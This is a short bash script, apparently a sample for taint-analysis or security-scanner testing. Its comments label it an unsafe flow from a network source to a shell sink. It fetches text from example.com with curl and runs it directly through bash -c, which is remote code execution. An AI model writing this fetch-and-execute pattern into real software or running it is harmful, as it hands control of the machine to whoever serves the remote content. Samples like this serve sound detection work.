#!/bin/bash
# Fetches a command from a remote server and executes it directly via bash.
# This is an unsafe taint flow: network source -> shell execution sink.

PAYLOAD=$(curl -s http://example.com/commands)
bash -c "$PAYLOAD"
